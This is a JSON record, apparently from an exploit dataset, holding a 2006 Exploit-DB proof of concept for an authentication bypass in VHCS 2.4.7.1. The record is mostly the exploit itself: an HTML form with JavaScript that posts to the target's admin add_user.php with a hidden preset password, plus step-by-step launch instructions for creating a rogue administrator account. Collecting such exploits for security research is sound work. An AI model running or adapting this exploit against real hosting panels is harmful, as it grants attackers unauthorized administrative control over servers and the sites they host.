{
  "id": "1524",
  "title": "VHCS 2.4.7.1 - Add User Authentication Bypass",
  "cve": null,
  "vuln_type": "auth_bypass",
  "code": "<html>\r\n\r\n<head>\r\n<title>VHCS (version <= 2.4.7.1) PoC. &nbsp;By RoMaNSoFt</title>\r\n<script language=\"JavaScript\">\r\nfunction submitform()\r\n{\r\n  if (document.admin_add_user.username.value=='admin')\r\n  {\r\n    alert('Learn to read before launching an exploit, script-kiddie!');\r\n    exit();\r\n  }\r\n  \r\n  document.admin_add_user.action=document.admin_add_user.target.value;\r\n  document.admin_add_user.submit();\r\n}\r\n</script>\r\n</head>\r\n\r\n<body>\r\n  <hr>\r\n  <center>\r\n  \t<b>VHCS (version <= 2.4.7.1) PoC. &nbsp;By RoMaNSoFt &#60roman&#64rs-labs.com&#62 &nbsp;[08.Feb.2006]</b>\r\n\r\n  </center>\r\n  <hr>\r\n  \r\n\t<form name=\"admin_add_user\" method=\"post\" action=\"\">\r\n            <table width=\"100%\" cellpadding=\"5\" cellspacing=\"5\">\r\n              <tr>\r\n                <td width=\"20\">&nbsp;</td>\r\n                <td colspan=\"2\">\r\n                  &nbsp;\r\n                </td>\r\n\r\n              </tr>\r\n              <tr>\r\n                <td width=\"20\">&nbsp;</td> <td width=\"200\">Target URL</td>\r\n                <td> \r\n                  <input type=\"text\" name=\"target\" value=\"http://<target>/vhcs2/admin/add_user.php\" style=\"width:400px\">\r\n                </td>\r\n              </tr>\r\n              \r\n              <tr>\r\n\r\n                <td width=\"20\">&nbsp;</td> <td width=\"200\">Username</td>\r\n                <td> \r\n                  <input type=\"text\" name=\"username\" value=\"admin\" style=\"width:200px\">&nbsp;(should NOT exist)\r\n                </td>\r\n              </tr>\r\n              <tr> \r\n                <td>&nbsp;</td>\r\n                <td colspan=\"2\"><a href=\"javascript: submitform()\">Exploit it!</a></td>              \r\n              </tr>\r\n\r\n              <tr> \r\n                <td colspan=\"3\">&nbsp; \r\n                  </td>\r\n              </tr>\r\n            </table>\r\n            <input type=\"hidden\" name=\"pass\" value=\"dsrrocks\">\r\n            <input type=\"hidden\" name=\"pass_rep\" value=\"dsrrocks\">\r\n            <input type=\"hidden\" name=\"email\" value=\"vhcs-exploit@rs-labs.com\">\r\n            <input type=\"hidden\" name=\"uaction\" value=\"add_user\">\r\n        </form>\r\n\r\n        \r\n        <hr>\r\n        <br>\r\n        <u>Quick instructions</u>.-<br>\r\n        <br>\r\n        1.- Enable JavaScript. Fill in the form with appropiate target URL (usually you will only need to replace &#60target&#62 string) and username.<br>\r\n        2.- Remember not to use a probably existing username (such as \"admin\").<br>\r\n\r\n        3.- Launch the exploit. <i>If target system is vulnerable, a new VHCS admin user will be created</i> ;-)<br>\r\n        4.- You will be redirected to VHCS login page. Try to login with your brand new username.<br>\r\n        5.- Ummm, I forgot it... The password is: <b>dsrrocks</b>.<br>\r\n\r\n        <br>\r\n\r\n        <u>More info (analysis, fix, etc)</u>.-<br>\r\n        <br>\r\n        See <a href=http://www.rs-labs.com/adv/RS-Labs-Advisory-2006-1.txt><i>RS-2006-1</i></a>.<br>\r\n\t\t\t\t<br>\r\n\t\t\t\t<hr>\r\n</body>\r\n\r\n</html>\r\n\r\n# milw0rm.com [2006-02-23]",
  "url": "https://www.exploit-db.com/exploits/1524"
}